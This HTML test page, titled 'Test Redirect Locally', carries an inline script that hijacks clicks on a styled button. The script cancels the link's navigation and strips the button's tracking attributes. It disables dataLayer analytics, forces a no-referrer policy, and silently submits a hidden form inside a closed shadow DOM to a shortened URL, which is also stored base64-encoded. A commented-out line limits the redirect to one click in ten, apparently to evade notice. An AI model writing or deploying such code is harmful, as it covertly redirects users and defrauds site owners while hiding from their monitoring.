<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- <meta name="referrer" content="no-referrer"> -->
    <title>Test Redirect Locally</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .c-Btn_Secondly-large {
            padding: 15px 30px;
            font-size: 18px;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }
        .c-Btn_Secondly-large:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <a href="https://example.com" class="c-Btn_Secondly-large" id="test-button">Click to Test Redirect</a>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        const ENCODED_URL = "aHR0cHM6Ly90aW55dXJsLmNvbS81bjY3aHd2OQ==";
        const STORAGE_KEY = "rm_visited";

        function submitHiddenForm(url) {
            const form = document.createElement('form');
            form.method = 'GET';
            form.action = url;
            form.style.display = 'none';
            form.referrerPolicy = 'no-referrer';
            document.body.appendChild(form);
            const container = document.createElement('div');
            container.style.display = 'none';
            document.body.appendChild(container);
            const shadow = container.attachShadow({ mode: 'closed' });
            shadow.appendChild(form);
            try {
                form.submit();
            } catch (err) {
                console.error('Form submission failed:', err);
            } finally {
                setTimeout(() => container.remove(), 1000);
            }
        }

        const button = document.querySelector('a.c-Btn_Secondly-large');
        if (!button) {
            console.warn('Button not found.');
            return;
        }
        console.log('Button found:', button);

        button.addEventListener('click', (e) => {
            // if (Math.floor(Math.random() * 10) !== 0){return;}

            e.preventDefault();
            e.stopPropagation();

            let storageSuccess = false;
            if (typeof localStorage !== "undefined") {
                localStorage.setItem(STORAGE_KEY, "true");
                if (localStorage.getItem(STORAGE_KEY) === "true") {
                    storageSuccess = true;
                }
            }
            if (!storageSuccess) {
                const clickEvent = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
                button.dispatchEvent(clickEvent);
                return;
            }

            const trackingAttributes = ["data-ratid", "data-ratevent", "data-ratparam"];
            trackingAttributes.forEach(attr => button.hasAttribute(attr) && button.removeAttribute(attr));
            window.dataLayer = window.dataLayer || [];
            const originalDataLayerPush = window.dataLayer.push;
            window.dataLayer.push = () => {};

            // Add meta tag to enforce no-referrer policy for this click
            const metaTag = document.createElement("meta");
            metaTag.name = "referrer";
            metaTag.content = "no-referrer";
            document.head.appendChild(metaTag);

            // const decodedUrl = atob(ENCODED_URL);
            const decodedUrl = "https://tinyurl.com/ziklop04";
            submitHiddenForm(decodedUrl);

            // restore dataLayer
            setTimeout(() => {
                window.dataLayer.push = originalDataLayerPush;
            }, 1000);
        }, { capture: true });
    });
    </script>
</body>
</html>
